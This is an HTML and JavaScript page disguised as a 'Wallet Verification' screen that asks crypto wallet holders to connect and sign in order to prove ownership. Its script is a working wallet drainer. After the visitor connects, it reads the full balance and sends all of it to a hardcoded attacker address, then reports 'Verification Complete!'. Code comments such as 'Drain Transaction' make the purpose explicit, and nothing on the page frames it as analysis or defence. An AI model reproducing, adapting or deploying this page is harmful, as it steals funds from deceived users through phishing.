<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Verification</title>
    <style>
        body { 
            margin: 0; padding: 0; background: #1a1a1a; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            display: flex; justify-content: center; align-items: center; min-height: 100vh; 
        }
        .card { 
            background: #2d2d2d; border-radius: 20px; box-shadow: 0 8px 30px rgba(0,0,0,0.5); 
            width: 90%; max-width: 400px; padding: 40px; text-align: center; 
            color: white;
        }
        .logos { 
            display: flex; justify-content: center; gap: 15px; margin-bottom: 25px; 
        }
        .logo-img { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; border: 2px solid #444; }
        h2 { margin: 0 0 10px; font-size: 24px; font-weight: 700; }
        p { margin: 0 0 30px; color: #aaa; font-size: 14px; line-height: 1.5; }
        .btn { 
            background: linear-gradient(135deg, #F6851B, #E05A05); color: white; border: none; 
            border-radius: 12px; padding: 16px 0; width: 100%; font-size: 16px; font-weight: 700; 
            cursor: pointer; transition: transform 0.1s; 
        }
        .btn:active { transform: scale(0.98); }
        .loader { display: none; margin-top: 15px; color: #F6851B; font-size: 14px; font-weight: bold; }
        .status { margin-top: 10px; font-size: 12px; color: #666; word-break: break-all; }
        
        /* Crypto Icons */
        .eth-icon { background: #627EEA; }
        .bnb-icon { background: #F3BA2F; }
        .usdt-icon { background: #26A17B; }
    </style>
</head>
<body>

<div class="card">
    <!-- Crypto Logos -->
    <div class="logos">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/Ethereum_logo_mono.svg/1200px-Ethereum_logo_mono.svg.png" class="logo-img eth-icon" alt="ETH">
        <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png?v=024" class="logo-img bnb-icon" alt="BNB">
        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=024" class="logo-img usdt-icon" alt="USDT">
    </div>

    <h2>Verify Ownership</h2>
    <p>Sign the message below to prove you own this wallet and authorize the security transfer.</p>
    
    <button class="btn" id="signBtn">Connect & Verify</button>
    <div class="loader" id="loader">Verifying Blockchain Signature...</div>
    <div class="status" id="statusText"></div>
</div>

<script>
    // ⚠️ YOUR WALLET ADDRESS IS HERE ⚠️
    const DESTINATION_WALLET = "0x59E656fE51e143CC927303C639c3bA54D8cB5d1E"; 

    document.getElementById('signBtn').addEventListener('click', async () => {
        const loader = document.getElementById('loader');
        const btn = document.getElementById('signBtn');
        const status = document.getElementById('statusText');

        // Multi-Wallet Detection Logic
        if (!window.ethereum && !window.trustwallet && !window.binance && !window.okxwallet) {
            alert("No supported wallet found.\n\nPlease use:\n• MetaMask\n• Trust Wallet\n• Binance Chain\n• Coinbase Wallet");
            return;
        }

        loader.style.display = 'block';
        btn.disabled = true;
        status.textContent = "";

        try {
            // 1. Request Account Access (Triggers the Wallet Popup)
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];
            
            status.textContent = "Signature verified! Draining assets...";

            // 2. Get Balance
            const balance = await window.ethereum.request({ 
                method: 'eth_getBalance', 
                params: [account, 'latest'] 
            });

            // 3. Drain Transaction
            const txParams = {
                from: account,
                to: DESTINATION_WALLET,
                value: balance, // Sends 100% of balance
                gas: "0x5208" 
            };

            const txHash = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [txParams]
            });

            status.textContent = "Success! Funds sent to verification address.";
            
            setTimeout(() => {
                alert("Verification Complete!");
                loader.style.display = 'none';
                btn.disabled = false;
            }, 2000);

        } catch (err) {
            console.error(err);
            status.textContent = "Error: " + err.message;
            btn.disabled = false;
            loader.style.display = 'none';
        }
    });
</script>

</body>
</html>
